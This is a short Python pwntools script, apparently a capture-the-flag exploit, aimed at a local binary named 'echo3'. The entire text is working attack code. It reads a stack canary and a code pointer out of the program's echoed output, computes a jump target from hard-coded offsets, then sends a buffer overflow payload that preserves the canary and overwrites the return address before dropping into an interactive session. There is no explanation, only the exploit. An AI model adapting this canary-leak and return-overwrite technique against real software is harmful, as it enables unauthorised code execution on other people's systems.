#! /usr/bin/env python

import pwn

conn = pwn.process('./echo3')

conn.recvuntil('Input size: ')
conn.sendline('200')
conn.recvuntil('Input data: ')
conn.sendline('x')

data = conn.recvuntil('Input size: ')

leak   = data[0x72:0x7a]
canary = data[0xa2:0xaa]
print('Canary: 0x%08x' % pwn.u64(canary))
print('Leak:   0x%08x' % pwn.u64(leak))

target = pwn.u64(leak) - 0x56223b200a5d + 0x56223b2008da

print('Target: 0x%08x' % target)
target = pwn.p64(target)

conn.sendline('200')

# target = pwn.p64(0x40088a)
conn.recvuntil('Input data: ')
conn.sendline('x' * 152 + canary + 'abcdefgh' + target + target)
# conn.sendline('x' * 200)

conn.recvuntil('Input size: ')
conn.sendline('4')
conn.recvuntil('Input data: ')
conn.sendline('exit')

conn.interactive()
